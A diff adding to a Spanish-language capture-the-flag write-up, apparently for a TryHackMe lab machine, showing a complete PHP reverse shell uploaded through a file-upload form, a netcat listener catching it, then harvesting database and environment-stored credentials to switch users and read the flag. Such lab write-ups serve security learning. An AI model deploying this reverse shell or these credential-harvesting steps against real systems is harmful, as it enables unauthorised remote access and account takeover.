@@ -142,5 +142,272 @@ luego de navegar un rato por la pagina, habia una opcion para subir archivos, y 
 
 .php y .py
 
+pusi como listener a netcat en el puerto 443 
+
+genere la siguiente reverse sehll : 
+
+
+<?php
+set_time_limit (0);
+$VERSION = "1.0";
+$ip = '192.168.138.111';
+$port = 443;
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = 'uname -a; w; id; sh -i';
+$daemon = 0;
+$debug = 0;
+
+if (function_exists('pcntl_fork')) {
+        $pid = pcntl_fork();
+
+        if ($pid == -1) {
+                printit("ERROR: Can't fork");
+                exit(1);
+        }
+
+        if ($pid) {
+                exit(0);  // Parent exits
+        }
+        if (posix_setsid() == -1) {
+                printit("Error: Can't setsid()");
+                exit(1);
+        }
+
+        $daemon = 1;
+} else {
+        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
+}
+
+chdir("/");
+
+umask(0);
+
+// Open reverse connection
+$sock = fsockopen($ip, $port, $errno, $errstr, 30);
+if (!$sock) {
+        printit("$errstr ($errno)");
+        exit(1);
+}
+
+$descriptorspec = array(
+   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
+   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
+   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
+);
+
+$process = proc_open($shell, $descriptorspec, $pipes);
+
+if (!is_resource($process)) {
+        printit("ERROR: Can't spawn shell");
+        exit(1);
+}
+
+stream_set_blocking($pipes[0], 0);
+stream_set_blocking($pipes[1], 0);
+stream_set_blocking($pipes[2], 0);
+stream_set_blocking($sock, 0);
+
+printit("Successfully opened reverse shell to $ip:$port");
+
+while (1) {
+        if (feof($sock)) {
+                printit("ERROR: Shell connection terminated");
+                break;
+        }
+
+        if (feof($pipes[1])) {
+                printit("ERROR: Shell process terminated");
+                break;
+        }
+
+        $read_a = array($sock, $pipes[1], $pipes[2]);
+        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
+
+        if (in_array($sock, $read_a)) {
+                if ($debug) printit("SOCK READ");
+                $input = fread($sock, $chunk_size);
+                if ($debug) printit("SOCK: $input");
+                fwrite($pipes[0], $input);
+        }
+
+        if (in_array($pipes[1], $read_a)) {
+                if ($debug) printit("STDOUT READ");
+                $input = fread($pipes[1], $chunk_size);
+                if ($debug) printit("STDOUT: $input");
+                fwrite($sock, $input);
+        }
+
+        if (in_array($pipes[2], $read_a)) {
+                if ($debug) printit("STDERR READ");
+                $input = fread($pipes[2], $chunk_size);
+                if ($debug) printit("STDERR: $input");
+                fwrite($sock, $input);
+        }
+}
+
+fclose($sock);
+fclose($pipes[0]);
+fclose($pipes[1]);
+fclose($pipes[2]);
+proc_close($process);
+
+function printit ($string) {
+        if (!$daemon) {
+                print "$string\n";
+        }
+}
+
+?>
+
+
+
+esa reverse shell la subi al sitio, y acedi al archivo donde se subio, una vez la abri netcatestablecio conexion 
+- 
+
+
+
+[davidoberst@archlinux ~]$ sudo nc -lvnp 443
+[sudo] password for davidoberst: 
+Listening on 0.0.0.0 443
+Connection received on 10.65.149.61 40526
+Linux mkingdom.thm 4.4.0-148-generic #174~14.04.1-Ubuntu SMP Thu May 9 08:17:37 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+ 16:48:24 up  1:36,  0 users,  load average: 0.02, 0.03, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data),1003(web)
+sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+$ 
+
+
+ahora vamois a ver que hay 
+
+
+
+
+$ cat database.php
+<?php
+
+return [
+    'default-connection' => 'concrete',
+    'connections' => [
+        'concrete' => [
+            'driver' => 'c5_pdo_mysql',
+            'server' => 'localhost',
+            'database' => 'mKingdom',
+            'username' => 'toad',
+            'password' => 'toadisthebest',
+            'character_set' => 'utf8',
+            'collation' => 'utf8_unicode_ci',
+        ],
+    ],
+];
+$ 
+
+
+como noi hay puerto ssh abierto, cambiare directamente a toad y usare esa contraseña. 
+
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+www-data@mkingdom:/$ su toad
+su toad
+Password: 
+
+
+toad@mkingdom:~$ cat smb.txt
+cat smb.txt
+
+Save them all Mario!
+
+                                      \| /
+                    ....'''.           |/
+             .''''''        '.       \ |
+             '.     ..     ..''''.    \| /
+              '...''  '..''     .'     |/
+     .sSSs.             '..   ..'    \ |
+    .P'  `Y.               '''        \| /
+    SS    SS                           |/
+    SS    SS                           |
+    SS  .sSSs.                       .===.
+    SS .P'  `Y.                      | ? |
+    SS SS    SS                      `==='
+    SS ""    SS
+    P.sSSs.  SS
+    .P'  `Y. SS
+    SS    SS SS                 .===..===..===..===.
+    SS    SS SS                 |   || ? ||   ||   |
+    ""    SS SS            .===.`==='`==='`==='`==='
+  .sSSs.  SS SS            |   |
+ .P'  `Y. SS SS       .===.`==='
+ SS    SS SS SS       |   |
+ SS    SS SS SS       `==='
+SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS
+
+toad@mkingdom:~$ 
+
+
+
+aun no hay bandera, sigamos biuscando : 
+
+el suaurio toad staba vacio, vamos a esclaar a mario.
+
+toad@mkingdom:~/Public$ env
+env
+APACHE_PID_FILE=/var/run/apache2/apache2.pid
+XDG_SESSION_ID=c2
+SHELL=/bin/bash
+APACHE_RUN_USER=www-data
+USER=toad
+LS_COLORS=
+PWD_token=aWthVGVOVEFOdEVTCg==
+MAIL=/var/mail/toad
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
+APACHE_LOG_DIR=/var/log/apache2
+PWD=/home/toad/Public
+LANG=en_US.UTF-8
+APACHE_RUN_GROUP=www-data
+HOME=/home/toad
+SHLVL=2
+LOGNAME=toad
+LESSOPEN=| /usr/bin/lesspipe %s
+XDG_RUNTIME_DIR=/run/user/1002
+APACHE_RUN_DIR=/var/run/apache2
+APACHE_LOCK_DIR=/var/lock/apache2
+LESSCLOSE=/usr/bin/lesspipe %s %s
+_=/usr/bin/env
+
+
+encontre un base 64 3n PWD_TOken, al decodificarlo 
+
+ikaTeNTANtES
+
+use esa ontraseña en mario, pude acceder a el 
+
+mario@mkingdom:/home/toad/Public$ whoami
+whoami
+mario
+
+al listar los archovos de /home/mario pude ver que esta user.txt, sin embargo al acceder a ella con cat dice 
+cat: user.txt: Permission denied
+asi que copie el archoivo a tmp, y desde tmp pude ver la bandera 
+
+
+mario@mkingdom:~$ cp user.txt /tmp
+cp user.txt /tmp
+mario@mkingdom:~$ cd /tmp
+cd /tmp
+mario@mkingdom:/tmp$ ls -a
+ls -a
+.  ..  .ICE-unix  user.txt  .X0-lock  .X11-unix
+mario@mkingdom:/tmp$ cat user.txt
+cat user.txt
+thm{030a769febb1b3291da1375234b84283}
+mario@mkingdom:/tmp$ 
+
+
+
+
+
 
 
